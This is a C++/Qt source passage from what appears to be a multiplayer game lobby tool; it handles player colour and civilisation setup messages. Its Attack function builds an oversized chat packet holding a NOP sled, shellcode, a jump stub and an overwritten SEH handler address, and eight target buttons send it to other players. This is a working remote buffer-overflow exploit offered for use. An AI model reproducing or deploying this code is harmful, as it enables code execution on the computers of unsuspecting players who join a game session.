    MPColorMsg.bMsgSubType = MP_SETUP_SCREEN_COLOR;

    i = 1;
    while(ui->bPlayerColor->text().toInt(0,10)!=i && i<=8) i++;

    if(i>=8) i-=8;
    i++;
    MPColorMsg.dwId = i;
    QColor = QColor.setNum(i);
    ui->bPlayerColor->setText(QColor);
    pSendMsg(DPID,DPID_ALLPLAYERS,&MPColorMsg,sizeof _MP_SESSION_PACKET);
}

void frm_chat::on_cbbPlayerCiv_currentIndexChanged(int index)
{
    _MP_SESSION_PACKET MPCivMsg;

    ZeroMemory(&MPCivMsg,sizeof _MP_SESSION_PACKET);

    MPCivMsg.bMsgType = MP_SETUP_SCREEN;
    MPCivMsg.bMsgSubType = MP_SETUP_SCREEN_CIV;

    (index==18) ? MPCivMsg.dwId = RANDOMCIV : MPCivMsg.dwId = index+1; //"None"

    pSendMsg(DPID,DPID_ALLPLAYERS,&MPCivMsg,sizeof _MP_SESSION_PACKET);
}

void frm_chat::on_bTarget1_clicked()
{
    Attack(0);
}

void frm_chat::on_bTarget2_clicked()
{
    Attack(1);
}

void frm_chat::on_bTarget3_clicked()
{
    Attack(2);
}

void frm_chat::on_bTarget4_clicked()
{
    Attack(3);
}

void frm_chat::on_bTarget5_clicked()
{
    Attack(4);
}

void frm_chat::on_bTarget6_clicked()
{
    Attack(5);
}

void frm_chat::on_bTarget7_clicked()
{
    Attack(6);
}

void frm_chat::on_bTarget8_clicked()
{
    Attack(7);
}

void frm_chat::Attack(int PlayerId)
{
    _MP_SETUP_CHAT *lpAttackerBuffer;
    SEHEntry *lpExploitSEH;

    int i = 0;
    while(dwPlayers[i]!=DPID && i<MAX_PLAYERS) i++;

    if(i<MAX_PLAYERS){
        lpAttackerBuffer = (_MP_SETUP_CHAT*)GlobalAlloc(GPTR,sizeof _MP_SETUP_CHAT+MP_SETUP_CHAT_MAX_SIZE);

        lpAttackerBuffer->bMsgType = MP_SETUP_CHAT;
        lpAttackerBuffer->bPlayerSource = i+1;
        lpAttackerBuffer->Destionation[PlayerId] = 'Y';
        lpAttackerBuffer->dwChatMsgLength = MP_SETUP_CHAT_MAX_SIZE;
        lpAttackerBuffer->bUnknown2 = 1;

        for(i=0;i<MP_SETUP_CHAT_MAX_SIZE-(421+9+3);i++) lpAttackerBuffer->szChatMessage[i] = '\x90';

        memmove(&lpAttackerBuffer->szChatMessage[i],shellcode,421);
        i += 421;
        memmove(&lpAttackerBuffer->szChatMessage[i],jmp_shellcode,9);
        i += 9;

        lpExploitSEH = (SEHEntry*)&lpAttackerBuffer->szChatMessage[i];
        lpExploitSEH->lpSEH = SEH_HANDLER_ADDR;

        pSendMsg(DPID,dwPlayers[PlayerId],lpAttackerBuffer,sizeof _MP_SETUP_CHAT+MP_SETUP_CHAT_MAX_SIZE);
        GlobalFree(lpAttackerBuffer);
    }
}
